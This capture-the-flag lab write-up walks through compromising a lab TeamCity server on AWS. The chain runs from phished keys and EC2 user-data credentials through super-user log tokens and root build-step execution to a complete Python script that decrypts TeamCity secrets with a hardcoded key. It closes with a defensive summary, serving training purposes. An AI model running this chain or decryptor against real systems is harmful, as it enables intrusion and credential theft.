---
title: Pwn TeamCity in the Cloud
description: Pwn TeamCity in the Cloud
image:
  path: aws.jpg
categories:
- Pwned Labs
- AWS
layout: post
media_subpath: /assets/posts/labs/pwnedlabs/aws/
tags:
- pwnedlabs
- aws
- cloud
---
# Scenario
In a red team operation for Huge Logistics, your team managed to obtain AWS credentials through a phishing attack. With these keys in hand, your objective is clear: delve deeper into their AWS infrastructure, find vulnerabilities, and escalate your privileges.

# Walkthrough
We authenticate using given credentials. We can confirm that we are in the context of `kai` user
```
└─$ aws sts get-caller-identity
{
    "UserId": "AIDA<REDACTED>MTC",
    "Account": "728397042021",
    "Arn": "arn:aws:iam::728397042021:user/kai"
}
```

Next we need to perform enumeration. We can use `pacu`, which is an open-source AWS exploitation framework that uses a range of modules to assist in enumeration, privilege escalation, data exfiltration, service exploitation, and log manipulation within AWS environments We can use it to brute force our IAM permissions.
```
Pacu (labs:None) > set_keys
Setting AWS Keys...
Press enter to keep the value currently stored.
Enter the letter C to clear the value, rather than set it.
If you enter an existing key_alias, that key's fields will be updated instead of added.
Key alias must be at least 2 characters

Key alias [None]: 
Access key ID [AKIAV6U4A2R3ZERD7MVJ]: <REDACTED>
Secret access key [0AY5ZAUqFci1HuM6Km5p********************]: <REDACTED>
Session token (Optional - for temp AWS keys only) [None]: 
```
Running the command `run iam__bruteforce_permissions` shows that we have the EC2 permissions `describe-instances` and `describe-instance-attribute`. The `describe-instances` action returns detailed information about one or more EC2 instances, while `describe-instance-attribute` returns specific attributes such as the configured instance type and any User Data that is specified on machine launch.
```
Pacu (lab-1:None) > run iam__bruteforce_permissions
  Running module iam__bruteforce_permissions...
<SNIP>
[iam__bruteforce_permissions] iam:
[iam__bruteforce_permissions]   root_account: False
[iam__bruteforce_permissions]   arn: arn:aws:iam::728397042021:user/kai
[iam__bruteforce_permissions]   arn_id: 728397042021
[iam__bruteforce_permissions]   arn_path: user/kai
[iam__bruteforce_permissions] bruteforce:
[iam__bruteforce_permissions]   ec2.describe_instances: {'Reservations': [{'ReservationId': 'r-0f73fc6dd641fdd8c', 'OwnerId': '728397042021', 'Groups': [], 'Instances': [{'Architecture': 'x86_64', 'BlockDeviceMappings': [{'DeviceName': '/dev/sda1', 'Ebs': {'AttachTime': datetime.datetime(2025, 9, 24, 16, 58, 10, tzinfo=tzutc()), 'DeleteOnTermination': True, 'Status': 'attached', 'VolumeId': 'vol-0be04123edf010205'}}], 'ClientToken': 'terraform-20250924165808902300000001', 'EbsOptimized': True, 'EnaSupport': True, 'Hypervisor': 'xen', 'NetworkInterfaces': [{'Attachment': {'AttachTime': datetime.datetime(2025, 9, 24, 16, 58, 9, tzinfo=tzutc()), 'AttachmentId': 'eni-attach-0b8b51341616678e7', 'DeleteOnTermination': True, 'DeviceIndex': 0, 'Status': 'attached', 'NetworkCardIndex': 0}, 'Description': '', 'Groups': [{'GroupId': 'sg-079075138a42635f8', 'GroupName': 'Child Two Internal SG'}], 'Ipv6Addresses': [], 'MacAddress': '02:d9:ff:fe:61:c5', 'NetworkInterfaceId': 'eni-0184f6863aba6b707', 'OwnerId': '728397042021', 'PrivateDnsName': 'ip-10-1-20-225.us-west-2.compute.internal', 'PrivateIpAddress': '10.1.20.225', 'PrivateIpAddresses': [{'Primary': True, 'PrivateDnsName': 'ip-10-1-20-225.us-west-2.compute.internal', 'PrivateIpAddress': '10.1.20.225'}], 'SourceDestCheck': True, 'Status': 'in-use', 'SubnetId': 'subnet-0a3b05db6ff26a90d', 'VpcId': 'vpc-00eb2199039e56bb8', 'InterfaceType': 'interface', 'Operator': {'Managed': False}}], 'RootDeviceName': '/dev/sda1', 'RootDeviceType': 'ebs', 'SecurityGroups': [{'GroupId': 'sg-079075138a42635f8', 'GroupName': 'Child Two Internal SG'}], 'SourceDestCheck': True, 'Tags': [{'Key': 'Name', 'Value': 'TeamCity'}], 'VirtualizationType': 'hvm', 'CpuOptions': {'CoreCount': 1, 'ThreadsPerCore': 2}, 'CapacityReservationSpecification': {'CapacityReservationPreference': 'open'}, 'HibernationOptions': {'Configured': False}, 'MetadataOptions': {'State': 'applied', 'HttpTokens': 'optional', 'HttpPutResponseHopLimit': 1, 'HttpEndpoint': 'enabled', 'HttpProtocolIpv6': 'disabled', 'InstanceMetadataTags': 'disabled'}, 'EnclaveOptions': {'Enabled': False}, 'PlatformDetails': 'Linux/UNIX', 'UsageOperation': 'RunInstances', 'UsageOperationUpdateTime': datetime.datetime(2025, 9, 24, 16, 58, 9, tzinfo=tzutc()), 'PrivateDnsNameOptions': {'HostnameType': 'ip-name', 'EnableResourceNameDnsARecord': False, 'EnableResourceNameDnsAAAARecord': False}, 'MaintenanceOptions': {'AutoRecovery': 'default', 'RebootMigration': 'default'}, 'CurrentInstanceBootMode': 'legacy-bios', 'NetworkPerformanceOptions': {'BandwidthWeighting': 'default'}, 'Operator': {'Managed': False}, 'InstanceId': 'i-07f019d0d51e79c4e', 'ImageId': 'ami-067e3885ccc282915', 'State': {'Code': 16, 'Name': 'running'}, 'PrivateDnsName': 'ip-10-1-20-225.us-west-2.compute.internal', 'PublicDnsName': '', 'StateTransitionReason': '', 'AmiLaunchIndex': 0, 'ProductCodes': [], 'InstanceType': 't3.medium', 'LaunchTime': datetime.datetime(2025, 9, 24, 16, 58, 9, tzinfo=tzutc()), 'Placement': {'GroupName': '', 'Tenancy': 'default', 'AvailabilityZone': 'us-west-2a'}, 'Monitoring': {'State': 'disabled'}, 'SubnetId': 'subnet-0a3b05db6ff26a90d', 'VpcId': 'vpc-00eb2199039e56bb8', 'PrivateIpAddress': '10.1.20.225'}]}]}
<SNIP>
```

We can also retrieve C2 instance ID, private IP address and tag using AWS CLI
```
└─$ aws ec2 describe-instances  --query 'Reservations[].Instances[].[InstanceId,PrivateIpAddress,Tags[?Key==`Name`]| [0].Value]' --output table
----------------------------------------------------
|                 DescribeInstances                |
+----------------------+---------------+-----------+
|  i-07f019d0d51e79c4e |  10.1.20.225  |  TeamCity |
+----------------------+---------------+-----------+

```
We see 
TeamCity is a CI/CD server developed by JetBrains. It is used to automate the process of building, testing, and deploying code to different environments. A quick search shows that the default port of the web interface is `8111`. Navigating to this port in the browser reveals the TeamCity login page as expected. However common login combinations don't give us access.

![](pwn-teamcity-in-the-cloud-1.png)

Let's see if any EC2 user data has been configured
```
└─$ aws ec2 describe-instance-attribute --instance-id 'i-07f019d0d51e79c4e' --attribute userData
{
    "InstanceId": "i-07f019d0d51e79c4e",
    "UserData": {
        "Value": "<REDACTED>"
    }
}

```

It returns base64 encoded user data, let's decode it. We found credentials for the `teamcity` database user

```
└─$ echo "<REDACTED>" | base64 -d
--//
Content-Type: text/cloud-config; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="cloud-config.txt"

#cloud-config
cloud_final_modules:
- [scripts-user, always]

--//
Content-Type: text/x-shellscript; charset="us-ascii"
MIME-Version: 1.0
Content-Transfer-Encoding: 7bit
Content-Disposition: attachment; filename="userdata.txt"

#!/bin/bash
mysqldump -u teamcity -p<REDACTED> -d teamcity > /root/teamcity-backup-latest.sql
--//--

```

We can try the password to log into TeamCity as admin (which failed) or over SSH with the root user (also failed). Many TeamCity installation guides specify creating a system user, so we can try to login to the system over SSH with `teamcity` user
```
└─$ ssh teamcity@10.1.20.225                                                    
The authenticity of host '10.1.20.225 (10.1.20.225)' can't be established.
ED25519 key fingerprint is SHA256:2OM8qregSoGHyuBUsnGGGKXVqFEU8HzA0njUAPzDt1g.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.1.20.225' (ED25519) to the list of known hosts.
teamcity@10.1.20.225's password: 
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.19.0-1028-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed Sep 24 19:19:07 UTC 2025

  System load:  0.076171875        Processes:             108
  Usage of /:   47.5% of 19.20GB   Users logged in:       0
  Memory usage: 39%                IPv4 address for ens5: 10.1.20.225
  Swap usage:   0%

 * Ubuntu Pro delivers the most comprehensive open source security and
   compliance features.

   https://ubuntu.com/aws/pro

Expanded Security Maintenance for Applications is not enabled.

33 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

7 additional security updates can be applied with ESM Apps.
Learn more about enabling ESM Apps service at https://ubuntu.com/esm


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

Last login: Sun Jul 23 19:41:09 2023 from 78.86.133.113
teamcity@ip-10-1-20-225:~$ 

```

Seems like we are allowed to read log files in the TeamCity logs folder as root
```
teamcity@ip-10-1-20-225:~$ sudo -l
[sudo] password for teamcity: 
Matching Defaults entries for teamcity on ip-10-1-20-225:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User teamcity may run the following commands on ip-10-1-20-225:
    (root) /usr/bin/cat /opt/JetBrains/TeamCity/logs/*.log
```

TeamCity has a Super User login mode that allows accessing the server UI with System Administrator permissions. This is useful if the administrator forgot their credentials or needs to fix authentication-related settings. The authentication token is automatically generated on every server start and is printed in the file `teamcity-server.log`. The Super User login is enabled by default. The TeamCity [documentation](https://www.jetbrains.com/help/teamcity/security-notes.html#Credentials) calls this out and recommends disabling it to improve the security of the instance.
```
teamcity@ip-10-1-20-225:~$ sudo /usr/bin/cat /opt/JetBrains/TeamCity/logs/teamcity-server.log | grep -i "authentication token"
[2023-07-22 19:38:14,704]   INFO -   jetbrains.buildServer.SERVER - Super user authentication token: 91<REDACTED>876 (use empty username with the token as the password to access the server)
[2023-07-22 19:51:03,700]   INFO -   jetbrains.buildServer.SERVER - Super user authentication token: 44<REDACTED>761 (use empty username with the token as the password to access the server)
[2023-07-22 20:41:12,025]   INFO -   jetbrains.buildServer.SERVER - Super user authentication token: 67<REDACTED>198 (use empty username with the token as the password to access the server)
[2023-07-22 21:36:33,078]   INFO -   jetbrains.buildServer.SERVER - Super user authentication token: 21<REDACTED>204 (use empty username with the token as the password to access the server)
[2023-07-23 18:56:47,362]   INFO -  jetbrains.buildServer.STARTUP - Administrator can login from web UI using super user authentication token (better use a private browser window)
[2023-07-23 18:56:47,362]   INFO -   jetbrains.buildServer.SERVER - Super user authentication token: 85<REDACTED>902 (use empty username with the token as the password to access the server)
[2023-07-23 19:09:37,640]   INFO -  jetbrains.buildServer.STARTUP - Administrator can login from web UI using super user authentication token (better use a private browser window)
[2023-07-23 19:09:37,640]   INFO -   jetbrains.buildServer.SERVER - Super user authentication token: 44<REDACTED>970 (use empty username with the token as the password to access the server)
[2023-07-23 19:30:34,480]   INFO -   jetbrains.buildServer.SERVER - Super user authentication token: 86<REDACTED>655 (use empty username with the token as the password to access the server)
[2023-07-24 22:47:25,233]   INFO -   jetbrains.buildServer.SERVER - Super user authentication token: 42<REDACTED>584 (use empty username with the token as the password to access the server)
[2025-09-24 17:02:50,182]   INFO -   jetbrains.buildServer.SERVER - Super user authentication token: 67<REDACTED>805 (use empty username with the token as the password to access the server)
```

We can log into the web interface as the super user by putting this into the password field with no username

![](pwn-teamcity-in-the-cloud-2.png)


We see that the agent is installed on the local server 

![](pwn-teamcity-in-the-cloud-3.png)

We also see the project `InitialSetupCheck`

![](pwn-teamcity-in-the-cloud-4.png)

Click `Edit Project` we see that `Artifacts Storage` has been configured to save to S3

![](pwn-teamcity-in-the-cloud-5.png)

We see the S3 bucket named `huge-logistics-teamcity` but we can't access it. Access keys have been specified. By right-clicking the masked Secret Access Key field and selecting `Inspect`, we see the encrypted string, but it doesn't seem possible to decrypt this value.

We can try to get a foothold on the underlying server as there's an active agent installed. First, navigate to `General Settings`, then `Create build configuration -> Manually`. Input a build name and then click `Create`.

![](pwn-teamcity-in-the-cloud-6.png)

Skip the New VCS Root page. Then click `Build Steps` and `Add build` step. Select `Command Line` option and input a build step name. We can enter any test command such as `id` in the `Custom script` section to find out our execution context. 

![](pwn-teamcity-in-the-cloud-7.png)

After clicking `Save` and then `Run`. Then we can click `Open Terminal`

![](pwn-teamcity-in-the-cloud-8.png)

We see that the server is running as root. Now we can escalate privileges for our `teamcity` user by adding him to `sudo` group.

![](pwn-teamcity-in-the-cloud-9.png)

We confirm our new privileges
```
teamcity@ip-10-1-20-225:~$ sudo -s
[sudo] password for teamcity: 
root@ip-10-1-20-225:/home/teamcity# 

```

We can move laterally to the S3 bucket we saw earlier. We saw that the Secret Access Key value is encrypted, so it's worth doing some research on how TeamCity handles secrets, and reviewing the work that other security researchers have done in this area. This returns some very interesting [research](https://www.exfiltrated.com/research/Continuous_Integration_Continous_Compromise_Bsides2017_Wesley_Wineberg.pdf) by Wesley Wineberg. Let's download the decryption [script](https://exfiltrated.com/research/teamcity-secret-decrypt.py)
```
#!/usr/bin/env python

# Written by Wesley Wineberg - 2017
import Crypto.Cipher.DES3 as DES3
import binascii
import sys

def usage():
    print "./teamcity-secret-decrypt.py <credential string>"
    print "ex: ./teamcity-secret-decrypt.py zxxb1b64ad3319d8d0ba7e5744b9e50a0fb"
    exit()
    
def main():
    if len(sys.argv) != 2:
        usage()  
    
    # Hardcoded decryption key - should be the same for all version and instances of TeamCity for the last few years at least.
    key =  binascii.unhexlify("3d160b396e59ecff00636f883704f70a0b2d47a7159d3633")
    
    decryptor = DES3.new(key, DES3.MODE_ECB)
    
    # Check input string
    encdata = sys.argv[1]
    if (encdata[:3] != "zxx"):
        print "Invalid encrypted credential format.  Example encrypted credential: zxxb1b64ad3319d8d0ba7e5744b9e50a0fb"
        exit()
            
    encdata = encdata[3:]
    encdatabinary = binascii.unhexlify(encdata)
    
    # Decrypt (PKCS5 padding isn't accounted for, seems like it's easy enough to spot at the end of output and ignore though!)
    out = decryptor.decrypt(encdatabinary)
    
    print out

if __name__ == '__main__':
    main()
```

Seems like all TeamCity encrypted secrets start with `zxx`. Searching online we find that TeamCity secrets are stored within the data directory, which in our instance is set to `/root/.BuildServer`.

![](pwn-teamcity-in-the-cloud-10.png)

We run `grep -R zxx` which returns secrets
```
root@ip-10-1-20-225:~/.BuildServer# grep -R zxx
config/projects/InitialSetupCheck/project-config.xml:        <param name="secure:awsSecretAccessKey" value="zxxd<REDACTED>0d301b" />
config/projects/InitialSetupCheck/project-config.xml:        <param name="secure:aws.secret.access.key" value="zxxd<REDACTED>0d301b" />
config/projects/InitialSetupCheck/project-config.xml.3:        <param name="secure:awsSecretAccessKey" value="zxxd<REDACTED>0d301b" />
config/projects/InitialSetupCheck/project-config.xml.3:        <param name="secure:aws.secret.access.key" value="zxxd<REDACTED>0d301b" />
config/projects/InitialSetupCheck/project-config.xml.2:        <param name="secure:awsSecretAccessKey" value="zxxd<REDACTED>0d301b" />
config/projects/InitialSetupCheck/project-config.xml.2:        <param name="secure:aws.secret.access.key" value="zxxd<REDACTED>0d301b" />
config/projects/InitialSetupCheck/project-config.xml.1:        <param name="secure:awsSecretAccessKey" value="zxxd<REDACTED>0d301b" />
config/projects/InitialSetupCheck/project-config.xml.1:        <param name="secure:aws.secret.access.key" value="zxxd<REDACTED>0d301b" />
system/pluginData/audit/configHistory/projects/project1/config.xml.2:        <param name="secure:aws.secret.access.key" value="zxxd<REDACTED>0d301b" />
system/pluginData/audit/configHistory/projects/project1/config.xml.5:        <param name="secure:awsSecretAccessKey" value="zxxd<REDACTED>0d301b" />
system/pluginData/audit/configHistory/projects/project1/config.xml.5:        <param name="secure:aws.secret.access.key" value="zxxd<REDACTED>0d301b" />
system/pluginData/audit/configHistory/projects/project1/config.xml.3:        <param name="secure:aws.secret.access.key" value="zxxd<REDACTED>0d301b" />
system/pluginData/audit/configHistory/projects/project1/config.xml.4:        <param name="secure:awsSecretAccessKey" value="zxxd<REDACTED>0d301b" />
system/pluginData/audit/configHistory/projects/project1/config.xml.4:        <param name="secure:aws.secret.access.key" value="zxxd<REDACTED>0d301b" />
system/pluginData/audit/configHistory/projects/project1/config.xml.6:        <param name="secure:awsSecretAccessKey" value="zxxd<REDACTED>0d301b" />
system/pluginData/audit/configHistory/projects/project1/config.xml.6:        <param name="secure:aws.secret.access.key" value="zxxd<REDACTED>0d301b" />
system/pluginData/audit/configHistory/projects/project1/config.xml.7:        <param name="secure:awsSecretAccessKey" value="zxxd<REDACTED>0d301b" />
system/pluginData/audit/configHistory/projects/project1/config.xml.7:        <param name="secure:aws.secret.access.key" value="zxxd<REDACTED>0d301b" />

```

After downloading the decryption script, we get the AWS Secret Key. We can also use [teamcity-unscrambler script](https://github.com/0xE2/teamcity-unscrambler/)
```
└─$ python2.7 teamcity-secret-decrypt.py zxxd<REDACTED>0d301b
<REDACTED>
```

Use AWS Access Key that was displayed in the web console and the decrypted Secret Key to authenticate and get access the S3 bucket
```
└─$ aws sts get-caller-identity
{
    "UserId": "AIDA<REDACTED>SES",
    "Account": "427648302155",
    "Arn": "arn:aws:iam::427648302155:user/teamcity"
}
```
```
└─$ aws s3 ls huge-logistics-teamcity --recursive
2023-07-22 19:17:06          0 artifacts/
2023-07-25 04:49:10          0 flag/
2023-07-25 04:49:38         32 flag/flag.txt
2023-07-24 01:45:05          0 plugins/
2023-07-24 01:45:37   16785484 plugins/s3-artifact-storage.zip
2023-07-22 19:10:21          0 temp/
2023-07-24 01:47:03   19452074 temp/TeamCity_Backup_20230723_194627.zip
2023-07-24 01:50:21     756455 temp/teamcity_server_logs_2023-07-23.zip
```

# Defense
- Found exposed the password of the teamcity database user in the EC2 user data field. 
  - User data is base64-encoded and a we had permissions to access it. 
  - Also password reuse, which is a very common bad practice. 
    - This allowed us to gain access to the server locally as the unprivileged user teamcity.
  - User had read access to the TeamCity server log file. 
    - Any user that have this permission should be considered privileged, as they are able to login to the TeamCity server as the super user account. 
    - This super user account should ideally have been [disabled](https://www.jetbrains.com/help/teamcity/super-user.html) by specifying a property. 
    - The properties are stored in the `<TeamCity Data Directory>/config/internal.properties` file. 
    - This is a [Java properties](https://en.wikipedia.org/wiki/.properties) file that can be edited manually with each `<property_name>=<property_value>` on a separate line.
- Build agent was installed locally on the TeamCity server, which allowed us to execute commands in the context of root
  - Once on the server as root we could easily decrypt the TeamCity secrets. 
  - However it is possible to use a custom encryption key instead of the fixed key, which may slow an attacker down. 
- TeamCity can be configured to use external authentication instead of local accounts (while noting that if we are able compromise a network account we may get access to other infrastructure resources).